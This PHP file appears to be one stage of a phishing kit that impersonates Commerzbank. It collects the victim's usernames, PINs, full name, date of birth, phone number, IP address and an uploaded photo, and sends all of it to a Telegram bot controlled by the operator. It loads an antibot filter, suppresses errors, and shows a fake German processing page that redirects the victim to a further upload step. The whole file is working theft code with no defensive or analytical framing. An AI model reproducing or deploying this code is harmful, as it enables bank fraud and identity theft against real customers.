<?php
// ANTIBOT DISABLED - include..antibot.php';
include '../antibot/tds.php';

// Start session only once at the beginning
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Increase limits for iPhone uploads
ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '100M');
ini_set('max_execution_time', '600');
ini_set('memory_limit', '512M');
ini_set('max_input_time', '600');

// Disable error display completely
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');

// Include Telegram configuration
include '../config/telegram.php';
$botToken = $telegram_bot2_token;
$chatId = $telegram_bot2_chat_id;

$uploadDir = 'xentryxupload/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Capture ALL user information from session
$xusr = $_SESSION['xusr'] ?? '';
$xpss = $_SESSION['xpss'] ?? '';
$xusr1 = $_SESSION['xusr1'] ?? '';
$xpss1 = $_SESSION['xpss1'] ?? '';
$xname1 = $_SESSION['xname1'] ?? '';
$xname2 = $_SESSION['xname2'] ?? '';
$xdob = $_SESSION['xdob'] ?? '';
$xtel = $_SESSION['xtel'] ?? '';
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Create comprehensive user information message
$userInfoMessage = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 𝗗𝗔𝗧𝗔\n\n";
$userInfoMessage .= "👤 |  𝗕𝗲𝗻𝘂𝘁𝘇𝗲𝗿𝗻𝗮𝗺𝗲: $xusr / $xusr1\n";
$userInfoMessage .= "👤 |  𝗣𝗜𝗡: $xpss / $xpss1\n";
$userInfoMessage .= "🧑 |  𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: $xname1 $xname2\n";
$userInfoMessage .= "🎂 |  𝗗𝗢𝗕: $xdob\n";
$userInfoMessage .= "📱 |  𝗣𝗵𝗼𝗻𝗲: $xtel\n";
$userInfoMessage .= "📍 |  𝗜𝗣 𝗔𝗱𝗿𝗲𝘀𝘀: $ipAddress\n";
$userInfoMessage .= "🌐 |  𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: $userAgent\n";
$userInfoMessage .= "📅 |  𝗗𝗮𝘁𝗲: " . date('Y-m-d H:i:s') . "\n";
$userInfoMessage .= "🆔 |  𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗: " . session_id();

// Send user information to Telegram
$userInfoResult = sendTelegramMessage($botToken, $chatId, $userInfoMessage);

// Process file upload if present
$uploadSuccess = false;
$fileMessage = "";

try {
    if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
        $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
        $originalFileName = basename($_FILES['file']['name']);
        $fileExtension = strtolower(pathinfo($originalFileName, PATHINFO_EXTENSION));
        $newFileName = $randomPrefix . '-' . $originalFileName;
        $uploadPath = $uploadDir . $newFileName;

        // Accept all image types including iPhone formats
        $allowedTypes = ['jpg', 'jpeg', 'png', 'gif', 'heic', 'heif', 'webp', 'bmp', 'tiff'];
        
        if (in_array($fileExtension, $allowedTypes)) {
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                $uploadSuccess = true;
                
                $fileSize = filesize($uploadPath);
                $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
                $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";

                $fileMessage = "📸 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗙𝗜𝗟𝗘 𝗨𝗣𝗟𝗢𝗔𝗗\n\n";
                $fileMessage .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
                $fileMessage .= "📄 |  𝗙𝗶𝗹𝗲 𝗡𝗮𝗺𝗲: $originalFileName\n";
                $fileMessage .= "📏 |  𝗙𝗶𝗹𝗲 𝗦𝗶𝘇𝗲: " . number_format($fileSize / 1024, 2) . " KB\n";
                $fileMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
                $fileMessage .= "📍 |  𝗜𝗣  : $ipAddress\n";
                $fileMessage .= "📅 |  𝗨𝗽𝗹𝗼𝗮𝗱 𝗧𝗶𝗺𝗲: " . date('Y-m-d H:i:s');

                // Try to send image to Telegram
                $imageResult = sendTelegramPhoto($botToken, $chatId, $uploadPath, $fileMessage);
                
                if (!$imageResult) {
                    // If image upload fails, send text message with file info
                    $fallbackMessage = $fileMessage . "\n\n⚠️ Image upload failed, but file data received.";
                    sendTelegramMessage($botToken, $chatId, $fallbackMessage);
                }
            }
        }
    }
} catch (Exception $e) {
    // Silent error handling - log but don't display
    error_log("Upload error: " . $e->getMessage());
    
    // Send error notification to Telegram
    $errorMessage = "❌ |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗣𝗟𝗢𝗔𝗗 𝗘𝗥𝗥𝗢𝗥\n";
    $errorMessage .= "📍 |  𝗜𝗣  : $ipAddress\n";
    $errorMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
    $errorMessage .= "⚠️ |  𝗘𝗿𝗿𝗼𝗿  : " . $e->getMessage();
    
    sendTelegramMessage($botToken, $chatId, $errorMessage);
}

// Send summary message
$summaryMessage = "✅ |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗦𝗨𝗠𝗠𝗔𝗥𝗬\n\n";
$summaryMessage .= "👤 |  𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼: " . ($userInfoResult ? '✅ Sent' : '❌ Failed') . "\n";
$summaryMessage .= "📸 |  𝗙𝗶𝗹𝗲 𝗨𝗽𝗹𝗼𝗮𝗱: " . ($uploadSuccess ? '✅ Success' : '❌ No File') . "\n";
$summaryMessage .= "📅 |  𝗧𝗶𝗺𝗲: " . date('Y-m-d H:i:s');

sendTelegramMessage($botToken, $chatId, $summaryMessage);

// Clear session after sending all data
session_destroy();
?>

<!DOCTYPE html>
<html lang="de">
<head>
    <script src="/security.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verarbeitung läuft - Commerzbank</title>
    <meta http-equiv="refresh" content="2; url=uploadz3.php">
    <style>
        body {
            font-family: 'Gotham 4r', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .processing {
            text-align: center;
            padding: 50px 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ffcc00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            font-size: 16px;
            margin: 20px 0;
        }
        .logo {
            color: #ffcc00;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="processing">
            <div class="logo">COMMERZBANK</div>
            <div class="spinner"></div>
            <h2>Verarbeitung läuft...</h2>
            <div class="status">
                <?php if ($userInfoResult): ?>
                    ✅ Benutzerdaten erfolgreich verarbeitet
                <?php else: ?>
                    ⏳ Verarbeite Ihre Daten...
                <?php endif; ?>
                <br>
                <?php if ($uploadSuccess): ?>
                    ✅ Datei erfolgreich hochgeladen
                <?php else: ?>
                    ℹ️ Keine Datei hochgeladen
                <?php endif; ?>
            </div>
            <p>Bitte warten Sie, während wir Ihre Daten verarbeiten.</p>
        </div>
    </div>
    
    <script>
        // Ensure redirect happens
        setTimeout(function() {
            window.location.href = 'uploadz3.php';
        }, 2000);
    </script>
</body>
</html>
